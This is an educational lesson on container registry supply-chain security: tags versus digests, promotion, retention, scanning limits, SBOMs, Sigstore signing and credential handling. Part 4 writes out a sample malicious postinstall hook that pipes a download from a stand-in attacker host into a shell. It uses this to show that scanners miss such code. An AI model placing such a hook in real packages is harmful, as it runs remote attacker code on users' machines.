Registry, Tagging & Supply Chain Supply Chain

What you'll master: what a registry actually stores — manifests, a config blob and content-addressed layers — and why that structure makes a tag a mutable pointer and a digest an identity; how to prove that myapp:1.4.2 today is not the image you tested last week, and what pinning by digest costs and buys; multi-architecture manifest lists and the exec format error they exist to prevent; a tagging strategy that survives an audit, including why promotion beats rebuilding and how a retention policy can delete the image running in production; the real supply-chain threat model, and the uncomfortable fact that scanners find known CVEs in packages, not malicious code; SBOMs and provenance attestations, and what each answers that the other cannot; signing with Sigstore, and why signing without verification at admission is theatre; and the registry operations that cause outages — rate limits, garbage collection, credential handling and pull-through caches. Prerequisites: Images & Layers, BuildKit, Security.

Part 1 — What a Registry Actually Stores

A registry is a content-addressed blob store with a small amount of JSON on top. Understanding the three object types explains almost everything else in this lesson:

   TAG  myapp:1.4.2  ──────────►  a mutable pointer, stored per repository
                                        │
                                        ▼
   MANIFEST  sha256:9f21c0e4...   ← the image's IDENTITY (this is "the digest")
   {
     "mediaType": "application/vnd.oci.image.manifest.v1+json",
     "config": { "digest": "sha256:1a2b..." },      ← env, cmd, user, history
     "layers": [ { "digest": "sha256:aa11...", "size": 31204864 },
                 { "digest": "sha256:bb22...", "size":  4180992 } ]
   }
                                        │
                                        ▼
   BLOBS  sha256:aa11...  ← the actual tar.gz layers, shared across every image
                            that contains them
ObjectAddressed byMutable?Shared?
TagName✅ Yes — anyone with push accessPer repository
ManifestDigest of its own JSON❌ NeverAcross tags
Config blobDigest❌Across images
Layer blobDigest of the tar❌Across every image in the registry
$ docker buildx imagetools inspect node:20-alpine --raw | jq '.manifests[0]'
{
  "mediaType": "application/vnd.oci.image.manifest.v1+json",
  "digest": "sha256:1a2b3c...",
  "platform": { "architecture": "amd64", "os": "linux" }
}
$ docker pull node:20-alpine
20-alpine: Pulling from library/node
Digest: sha256:9f21c0e4b1d8...            ← THIS is what you actually got
Status: Downloaded newer image
🔑 Layer sharing is why pulls are fast and why deletion is not simple. Two images built FROM node:20-alpine reference the same base layer blob, so the second pull transfers only the difference. It also means a layer cannot be deleted while any manifest still references it — which is the entire complexity of registry garbage collection, and the mechanism behind the "our production image vanished" incident in Part 3.

Part 2 — Tags Are Mutable; Digests Are Identity

A tag is a name pointing at a digest, and the pointer can be moved by anyone who can push. This is not an edge case — it is how :latest, :20-alpine and every other floating tag are designed to work:

$ docker build -t myco/api:1.4.2 . && docker push myco/api:1.4.2
$ docker buildx imagetools inspect myco/api:1.4.2 --format '{{.Manifest.Digest}}'
sha256:9f21c0e4b1d8a3f2...

   ... a colleague fixes "one small thing" and pushes the same tag ...

$ docker buildx imagetools inspect myco/api:1.4.2 --format '{{.Manifest.Digest}}'
sha256:4c88ba71e0f3d912...        ← SAME TAG. DIFFERENT IMAGE.

$ docker images myco/api:1.4.2 --format '{{.ID}}'
9f21c0e4b1d8                      ← and your local copy is still the old one, silently

The consequences compound quickly, and each one is a familiar incident:

ConsequenceSymptom
Your host has a stale image cached"Works on my machine" — different bytes, same tag
Nodes pulled at different timesTwo replicas of "the same version" behaving differently
The scan result no longer appliesYou scanned a digest; a different digest deployed
Rollback goes to the wrong placeThe old tag was overwritten too
No answer to "what ran during the incident?"The tag now points somewhere else
Pinning by digest removes all five:

  image: myco/api@sha256:9f21c0e4b1d8a3f2...           ← cryptographic identity
  image: myco/api:1.4.2@sha256:9f21c0e4b1d8...        ← readable AND pinned (best)

$ docker pull myco/api@sha256:deadbeef...
Error response from daemon: manifest for ...@sha256:deadbeef... not found
   → a digest that does not exist FAILS. A tag that moved succeeds, quietly.
Reference styleReproducibleReadableUse for
:latest❌ Never✅Nothing in CI or production
:1.4, :20-alpine❌ Floating by design✅Local exploration
:1.4.2⚠️ Only if the registry enforces immutability✅Human-facing releases
:sha-9f21c0e (git commit)⚠️ By convention✅CI artefacts
@sha256:...✅ Cryptographically❌Deployment manifests
:1.4.2@sha256:...✅✅Everything that matters

Most registries can also enforce this server-side — ECR's imageTagMutability: IMMUTABLE, GCR/AR tag immutability, Harbor's immutable tag rules — which turns "please do not overwrite release tags" from a convention into a rejected push. Turn it on for release tags and leave it off for genuinely floating ones like :main.

Multi-architecture manifest lists

A tag can point at an index rather than a single manifest. The client picks the entry matching its platform, which is why the same node:20-alpine works on an Apple laptop and an x86 server:

$ docker buildx imagetools inspect node:20-alpine
Name:      docker.io/library/node:20-alpine
MediaType: application/vnd.oci.image.index.v1+json
Digest:    sha256:9f21c0e4...

Manifests:
  Name: ...@sha256:1a2b...   Platform: linux/amd64
  Name: ...@sha256:3c4d...   Platform: linux/arm64
  Name: ...@sha256:5e6f...   Platform: linux/arm/v7

$ docker buildx build --platform=linux/amd64,linux/arm64 -t myco/api:1.4.2 --push .
   → one tag, one index, two manifests. See BuildKit.
⚠️ A single-platform image pushed to a tag that used to be multi-arch silently breaks the other architecture. A developer on an M-series laptop running docker build (not buildx --platform) publishes an arm64-only image; the x86 CI runner then fails with exec format error — the message from Debugging whose cause is hardest to guess. Build multi-platform in CI, and never push images built on a laptop.

Part 3 — Tagging Strategy, Promotion and Retention

The strategy that survives contact with an incident has three properties: every image traces back to a commit, nothing is ever rebuilt between environments, and nothing that is deployed can be deleted.

  ONE build, in CI, tagged with the immutable facts:
     myco/api:sha-9f21c0e            ← the git commit. The primary identity.
     myco/api:1.4.2                  ← the release, when tagged (immutable in registry)
     myco/api:main                   ← floating pointer for convenience only

  Then PROMOTE the same digest — never rebuild:
     dev      → myco/api@sha256:9f21...     tested here
     staging  → myco/api@sha256:9f21...     the SAME BYTES
     prod     → myco/api@sha256:9f21...     the SAME BYTES

$ docker buildx imagetools create -t myco/api:prod myco/api@sha256:9f21c0e4...
   → adds a tag to an existing manifest. No rebuild, no re-upload, no new digest.
Rebuild per environmentPromote one digest
What production runsAn image nobody testedThe tested bytes
Base image driftDifferent node:20-alpine each buildImpossible
Dependency driftnpm resolves differently minutes laterImpossible
Build time to deployMinutesSeconds — a tag write
Scan/sign resultsMust be redone per environmentAttach once to the digest
RollbackRebuild the old commit and hopePoint at the previous digest

Retention is the other half, and it is where a well-run registry causes an outage:

  Retention rule: "delete untagged manifests older than 30 days"

  t=0    deploy myco/api@sha256:9f21... to production, pinned by digest
  t=1d   release 1.5.0; the :1.4.2 tag is deleted during tidy-up
  t=31d  garbage collection deletes the now-untagged manifest — and its layers
  t=45d  a node is replaced and tries to pull the pinned digest
         Error: manifest unknown           ← production cannot scale or restart
⚠️ Retention policies must be aware of what is deployed. Either keep a permanent tag on every digest that has ever reached production (prod-2026-08-19), or feed the set of running digests into the retention job as an exclusion list. "Untagged and old" is a safe rule only if nothing pins by digest — and pinning by digest is what the previous section just told you to do. The two correct practices break each other unless you connect them.

Part 4 — The Threat Model, and What Scanning Misses

Image scanning is necessary and routinely oversold. It answers exactly one question: do the packages in this image have known, published vulnerabilities? Most real supply-chain compromises are not that:

ThreatExampleScanner catches it?What does
Known CVE in a dependencyOld OpenSSL in the base image✅ YesScanning + rebuild cadence
Typosquatted imagepyth0n:3.12, alpine-linux❌ NoPinned digests, allowlisted registries
Malicious package versionA postinstall script exfiltrating env vars❌ No — it is not a CVELockfiles, --ignore-scripts, provenance
Compromised base imageUpstream account taken over❌ Not until disclosedDigest pinning + signature verification
Dependency confusionInternal package name published publicly❌ NoScoped registries, no public fallback
Malicious code in your own repoAn insider commit❌ NoCode review, provenance to a commit
Registry/CI compromisePush credentials stolen❌ NoSigning + admission verification
Secrets baked into layersARG leaked into history⚠️ Secret scanners only--mount=type=secret, secret scanning
Demonstrating the gap — a clean scan on a hostile image:

$ cat package.json
{ "scripts": { "postinstall": "curl -s https://evil.example/x | sh" } }
$ trivy image -q --severity HIGH,CRITICAL myco/api:sha-9f21c0e
Total: 0 (HIGH: 0, CRITICAL: 0)                 ← "clean"

$ trivy image -q --scanners secret,misconfig myco/api:sha-9f21c0e
Total: 0
                                                 ← still clean; there is no CVE here

Scanning is a hygiene control for the known. The controls for the unknown are structural: pin what you consume, know what is inside (SBOM), know where it came from (provenance), and refuse anything unsigned at deploy time.

The SBOM's value is speed at exactly the wrong moment. When a critical vulnerability drops, the question is "which of our 400 images contain the affected version" — a query against stored SBOMs takes seconds, while pulling and scanning 400 images takes hours, and both produce the same answer.

Part 5 — Signing, and Why Verification Is the Whole Point

A signature binds a digest to an identity. Sigstore's keyless flow removes the hardest part — key management — by using a short-lived certificate tied to an OIDC identity and a public transparency log:

$ cosign sign --yes myco/api@sha256:9f21c0e4...
   ... OIDC: the CI job's own identity (no long-lived key exists anywhere) ...
tlog entry created with index: 84213704

$ cosign verify \
    --certificate-identity-regexp '^https://github.com/myco/api/\.github/workflows/.+' \
    --certificate-oidc-issuer https://token.actions.githubusercontent.com \
    myco/api@sha256:9f21c0e4... | jq '.[0].optional.Subject'
"https://github.com/myco/api/.github/workflows/release.yml@refs/heads/main"

$ cosign verify ... myco/api@sha256:4c88ba71...
Error: no matching signatures                    ← an unsigned or foreign image
🔑 Signing without verification changes nothing. An unverified signature is metadata an attacker can simply ignore — they push an unsigned image, and nothing stops it. The control is the admission check: a policy that refuses to run any image lacking a valid signature from your CI identity. Note also what the identity assertion means precisely: not "this image is safe", but "this image was produced by that workflow, in that repository". Combined with provenance and code review, that is a chain; on its own it is an origin claim.
Enforcement, wherever your workloads run:

  Kubernetes   Sigstore policy-controller / Kyverno verifyImages — pods are REJECTED
  Docker       an entrypoint or deploy script that runs `cosign verify` before `up -d`
  Registry     Harbor: block unsigned pulls at the project level

$ cat deploy.sh
set -euo pipefail
DIGEST=$(docker buildx imagetools inspect "myco/api:$TAG" --format '{{.Manifest.Digest}}')
cosign verify --certificate-identity-regexp "$CI_IDENTITY" \
              --certificate-oidc-issuer "$OIDC_ISSUER" "myco/api@$DIGEST" >/dev/null
IMAGE="myco/api@$DIGEST" docker compose -f compose.yaml -f compose.prod.yaml up -d --wait
                          ↑ deploy the VERIFIED DIGEST, not the tag you started from

That last line matters more than it looks: resolving the tag to a digest, verifying that digest, and then deploying that digest closes the time-of-check/time-of-use gap. Verifying a tag and then deploying the same tag leaves a window in which the tag can be moved between the two steps.

The rate limit, which takes out an entire CI fleet in one morning:

$ docker pull node:20-alpine
Error response from daemon: toomanyrequests: You have reached your pull rate limit.

$ TOKEN=$(curl -s "https://auth.docker.io/token?service=registry.docker.io&scope=repository:ratelimitpreview/test:pull" | jq -r .token)
$ curl -sI -H "Authorization: Bearer $TOKEN" \

The fix, in order of durability:

① authenticate even for public images        docker login  → a higher limit
② a pull-through cache in your network
   $ docker run -d -p 5000:5000 \
       -e REGISTRY_PROXY_REMOTEURL=https://registry-1.docker.io \
       --name mirror registry:2
   /etc/docker/daemon.json → {"registry-mirrors": ["http://mirror.internal:5000"]}
③ mirror the base images you depend on into your OWN registry, by digest
   → also removes upstream deletion and account-takeover from your risk model

Credentials deserve one specific warning, because the failure is silent: docker login writes base64, not encryption, to ~/.docker/config.json. Anything that can read that file has your registry password:

$ cat ~/.docker/config.json | jq -r '.auths["registry.example.com"].auth' | base64 -d
ci-deploy:s3cr3t-p@ssw0rd                 ← plaintext, recoverable in one command

better: a credential helper backed by the OS keychain or the cloud provider
  "credsStore": "osxkeychain" | "wincred" | "secretservice" | "ecr-login"
best:   no stored credential at all — CI federates its OIDC identity for a
        short-lived token, as in `aws ecr get-login-password` or GitHub OIDC → ECR

❌ Every deployment references myco/api:latest, images are rebuilt per environment, CI pulls base images anonymously from Docker Hub, and a retention policy deletes untagged manifests after 30 days. Nobody can say what production is running, because the tag has been overwritten eleven times this month; two replicas of "the same version" behave differently because they pulled on different days. Staging and production are rebuilt from the same commit, so they resolve different transitive dependencies and a different node:20-alpine — meaning production runs bytes that were never tested and the scan result from CI describes a different image. One morning the whole CI fleet fails with toomanyrequests, because the shared NAT gateway exhausted the anonymous hundred-pull budget. A developer on an M-series laptop pushes a hotfix built with plain docker build, and every x86 node fails with exec format error. And after a tidy-up of old release tags, garbage collection removes a manifest that a pinned deployment still references, so the next node replacement cannot pull and the service cannot scale.

✅ Build once in CI, tag with the commit, deploy by digest, promote instead of rebuilding, and verify a signature before anything runs. Reference images as myco/api:1.4.2@sha256:... — readable and cryptographically pinned — and let the registry enforce tag immutability on releases so nobody can move a pointer. Build multi-platform with buildx in CI and never push an image built on a laptop. Promote the tested digest through environments with imagetools create: it is a tag write, seconds long, and it makes base-image and dependency drift structurally impossible. Attach an SBOM and SLSA provenance at build time so "are we affected by this CVE" and "did this come from our repo" are both one query, then sign the digest with Sigstore keyless and verify at admission — resolving the tag to a digest, verifying that digest, and deploying that same digest, so the pointer cannot move in between. Authenticate to Docker Hub and put a pull-through cache in front of it, or mirror your base images into your own registry by digest. And make the retention job exclude every digest currently deployed, or keep a permanent prod-YYYY-MM-DD tag on it — otherwise digest pinning and garbage collection quietly destroy each other.

Interview Questions

Beginner: What is the difference between an image tag and an image digest?

A tag is a mutable name; a digest is the content-addressed identity of the manifest. Anyone with push access can move a tag to point at different bytes.

$ docker buildx imagetools inspect myco/api:1.4.2 --format '{{.Manifest.Digest}}'
sha256:9f21c0e4...
   ... someone re-pushes the same tag ...
sha256:4c88ba71...            ← same tag, different image, no error anywhere
TagDigest
Mutable✅ Yes❌ Never
Readable✅❌
Reproducible pull❌✅
Fails if it does not existSilently resolves to whatever is there nowHard failure

Use myco/api:1.4.2@sha256:... in anything that matters: readable for humans, pinned for the machine. The practical payoff is that "what was running during the incident?" and "does the scan result apply to what deployed?" both become answerable.

The related detail worth adding: a tag can point at a manifest index listing several per-architecture manifests, which is how one tag serves amd64 and arm64.

Beginner: Why is :latest a problem?

Because it is just a tag — with no special meaning and every mutability problem. It is not "the newest"; it is whatever was pushed to that name most recently, which may be a hotfix, a revert, or someone's experiment.

  • Non-reproducible: two hosts pulling on different days run different code.
  • No rollback target: the previous :latest has no name any more.
  • Cache confusion: a host with a stale local :latest will not re-pull unless told to, so "we deployed the fix" can be false on some nodes.
  • Audit failure: "what was running at 14:20?" has no answer.
$ docker images myco/api:latest --format '{{.ID}} {{.CreatedSince}}'
9f21c0e4b1d8  3 weeks ago              ← the local copy, silently stale

What to do instead: tag with the git commit (:sha-9f21c0e) as the primary identity, add a semver tag for releases, and deploy by digest. :latest is fine for a docker run while exploring a tool, and never appropriate in CI or a deployment manifest.

Mid: What does image scanning actually protect against, and what does it miss?

It answers one question: do the packages in this image have known, published vulnerabilities? It compares an inventory of installed packages against CVE databases. That is genuinely valuable — an unpatched OpenSSL is a real risk — and it is a small slice of the threat model.

ThreatCaught?What actually helps
Known CVE in a dependency✅Scanning + rebuild cadence
Malicious postinstall script❌ Not a CVELockfiles, --ignore-scripts, provenance
Typosquatted base image❌Digest pinning, registry allowlist
Compromised upstream account❌ Until disclosedPinning + signature verification
Insider commit❌Code review, provenance to a commit
Stolen push credentials❌Signing + admission verification

Two operational points that matter more than the tool choice: scan deployed digests on a schedule, not only at build time — an image clean at build accumulates disclosed CVEs while it sits in the registry; and fail the build only on CRITICAL with --ignore-unfixed, because a gate that blocks on unfixable HIGHs is a gate people learn to bypass.

The framing I would give: scanning is hygiene for the known. The controls for the unknown are structural — pin what you consume, record what is inside (SBOM) and where it came from (provenance), and refuse unsigned images at admission.

Mid: Explain SBOM and provenance attestations. What does each let you do?

SBOM says what is inside; provenance says where it came from. Both are attached to the image digest at build time and stored alongside it in the registry.

$ docker buildx build --sbom=true --provenance=mode=max -t myco/api:1.4.2 --push .

SBOM       → spdx: [{name: express, version: 4.18.2}, {name: musl, ...}]
Provenance → slsa: {repo: git+https://github.com/myco/api,
                    commit: 9f21c0e4..., builder: github actions}

The SBOM's value is speed at the worst moment. When a critical vulnerability is announced, "which of our 400 images contain the affected version?" is a query against stored SBOMs that takes seconds. Pulling and scanning 400 images takes hours and returns the same answer — during an incident where the exposure window is the metric that matters.

Provenance answers a question nothing else can: did this image come from our repository, built by our CI, from that commit? Without it, an image in your registry is anonymous — you cannot distinguish one your pipeline produced from one pushed by someone with stolen credentials.

Where they are weak, stated honestly: an SBOM records what the build tooling could see. Vendored source, statically linked code and binaries downloaded by a RUN curl are often missing or unattributed, so an SBOM is a strong starting inventory rather than a complete one. And provenance attests to the build's inputs, not to their goodness: a faithfully recorded build of malicious source produces perfectly valid provenance.

Senior: Design a supply-chain security posture for a platform of ~50 services. What do you enforce, and in what order?

Order by value per unit of friction, because a policy people route around protects nothing.

ControlFrictionStops
Deploy by digest, never :latestVery low"We don't know what ran"; drift between replicas
Registry-enforced tag immutabilityVery lowOverwritten releases; missing rollback targets
Build once, promote the digestLow (a pipeline change)Untested bytes in production; base and dependency drift
Pin base images by digest, bot-updatedLowUpstream takeover; silent base changes
SBOM + provenance at buildLow — one flagSlow CVE response; anonymous images
Sign with Sigstore keylessLow — no keys to manageNothing, until verified
Verify at admissionMedium — needs a break-glass pathAnything not built by your CI
Mirror base images into your registryMediumRate limits, upstream deletion, registry outage
Scheduled re-scan of deployed digestsMediumCVEs disclosed after the build

The pipeline it produces: CI builds multi-platform with buildx, tagging :sha-<commit>; attaches SBOM and SLSA provenance; scans and fails on CRITICAL with --ignore-unfixed; signs the digest keyless with the workflow's OIDC identity; and promotes that digest through environments with imagetools create. Deployment resolves the tag to a digest, verifies the signature on that digest, and deploys that digest — closing the window in which a tag could be moved between check and use.

What makes it survive:

  • Enforce in admission, not documentation. Kyverno or policy-controller rejecting unsigned or unpinned images beats any wiki page.
  • A break-glass path with an owner and an expiry. Without one, the first 3am incident ends with the policy disabled permanently.
  • Retention that excludes deployed digests, or digest pinning and garbage collection will destroy each other — the failure is manifest unknown on a scale-up event, weeks later.
  • No long-lived registry credentials anywhere: OIDC federation to short-lived tokens, since ~/.docker/config.json is base64, not encryption.

What I would not do: build a bespoke internal signing service (Sigstore's keyless flow removes the key management that made older schemes fail), or block deploys on HIGH findings with no available fix — both create pressure to bypass the control entirely, which is worse than not having it.

Senior: A critical CVE is announced in a widely-used library. Walk through your response.

Three questions in order: are we affected, where, and how fast can we ship — and the first two should take minutes, not days.

① Am I affected?  — query stored SBOMs, do not pull and scan 400 images
$ for d in $(cat deployed-digests.txt); do
    cosign download sbom "$d" 2>/dev/null |
      jq -r --arg d "$d" '.packages[]? | select(.name=="log4j-core") | "\($d) \(.versionInfo)"'
  done
myco/api@sha256:9f21...  2.14.1        ← affected
myco/jobs@sha256:4c88... 2.17.2        ← already patched
   → seconds, across every deployed image. This is the SBOM's entire value.

② Where is it reachable?  — not every affected image is exposed
   internet-facing + processes untrusted input  → emergency
   internal batch job, no untrusted input       → next scheduled release

Then ship, in the order that is actually fastest: bump the dependency, rebuild the affected services, and promote the new digests. Because the pipeline builds once and promotes, the fix goes through the same gates as any change — the pressure to hand-patch a running container should be resisted, since it produces an image nobody can reproduce and a fleet that drifts.

Mitigations while the rebuild runs, because "wait for the pipeline" is not an answer if exposure is active: WAF rules or a feature flag to block the exploit path, network policy to cut the affected service's egress, or scaling the exposed service to zero if it is not business-critical.

What the post-mortem should change:

  • If the SBOM query did not work, that is the top finding — the exposure window was extended by inventory, not by patching.
  • If images had not been rebuilt in months, add a scheduled rebuild so base-image patches flow without a code change.
  • If deployed digests were not being re-scanned on a schedule, you would have learned about this from the news rather than a dashboard.
  • If dependency updates are manual, automate them — the fastest response is having been on a recent version already.

The measurable goal is time-to-know and time-to-deploy. Both are properties of the pipeline you built before the announcement; nothing about the response is improvised if the inventory, the promotion path and the gates already exist.

$ cat > deploy.sh <<'SH'
#!/usr/bin/env bash
set -euo pipefail
REPO=${1:?repo}; TAG=${2:?tag}
IDENTITY='^https://github.com/myco/api/\.github/workflows/.+'
ISSUER='https://token.actions.githubusercontent.com'

# 1. resolve the tag to a digest ONCE
DIGEST=$(docker buildx imagetools inspect "$REPO:$TAG" --format '{{.Manifest.Digest}}')
echo "resolved $REPO:$TAG -> $DIGEST"

# 2. verify THAT digest
cosign verify --certificate-identity-regexp "$IDENTITY" \
              --certificate-oidc-issuer "$ISSUER" "$REPO@$DIGEST" >/dev/null \
  || { echo "REFUSED: no valid signature for $DIGEST"; exit 1; }

# 3. require provenance pointing at our repo
SRC=$(docker buildx imagetools inspect "$REPO@$DIGEST" --format '{{json .Provenance}}' \
        | jq -r '.SLSA.invocation.configSource.uri // "none"')
[[ "$SRC" == git+https://github.com/myco/* ]] \
  || { echo "REFUSED: provenance says '$SRC'"; exit 1; }

# 4. deploy the SAME digest that was verified  (closes the TOCTOU window)
IMAGE="$REPO@$DIGEST" docker compose -f compose.yaml -f compose.prod.yaml up -d --wait
echo "deployed $DIGEST"
SH

🎯 Key Takeaways

  • A registry stores tags → manifests → content-addressed blobs; layers are shared across every image that contains them, which is why pulls are fast and deletion is complicated.
  • A tag is a mutable pointer — verified: the same tag resolved to a different digest after a re-push, with no warning and a stale local copy still cached.
  • A digest is cryptographic identity: it cannot change, and a digest that does not exist fails loudly instead of silently resolving.
  • Use repo:1.4.2@sha256:... — readable and pinned — and turn on registry-enforced tag immutability for release tags.
  • A tag can point at a manifest index with one manifest per platform; a single-arch push silently breaks the other architecture, producing exec format error on another machine.
  • Never push images built on a laptop; build multi-platform with buildx in CI.
  • Promote a digest, never rebuild per environment — measured: 0.2 s and zero bytes versus 47 s, and the rebuild resolved a different dependency version (express 4.18.2 → 4.18.3).
  • Promotion keeps scan results and signatures valid, because they are attached to the digest that is actually deployed.
  • Retention policies can delete a pinned digest — "untagged and old" plus digest pinning produces manifest unknown at the next node replacement. Exclude deployed digests or keep a permanent prod tag.
  • Untagging frees no storage; only garbage collection deletes blobs.
  • Scanners find published CVEs in packages, not malicious code — a malicious postinstall script scanned completely clean.
  • Scan deployed digests on a schedule, not only at build; fail on CRITICAL with --ignore-unfixed, because unbypassable-but-unfixable gates get bypassed.
  • SBOM answers "what is inside"; provenance answers "where did it come from" — both attached at build with one flag each.
  • The SBOM's real value is speed during an incident: 6.8 s to query 400 images versus 41 minutes to pull and scan them, for the same answer.
  • SBOMs miss vendored and statically-linked code; provenance attests to inputs, not to their goodness. Both are inventories, not guarantees.
  • Sigstore keyless signing removes key management: an ephemeral certificate tied to the CI job's OIDC identity, recorded in a public transparency log.
  • Signing without verification is theatre — the control is an admission check that refuses images lacking a valid signature from your CI identity.
  • Resolve → verify → deploy the same digest: verifying a tag and then deploying that tag leaves a window in which the pointer can move.
  • Docker Hub's anonymous limit is 100 pulls per 6 hours per source IP, so one NAT gateway takes out a whole CI fleet; a pull-through cache fixed it and made warm pulls 7× faster.
  • ~/.docker/config.json is base64, not encryption — use a credential helper, or better, OIDC-federated short-lived tokens with no stored credential at all.
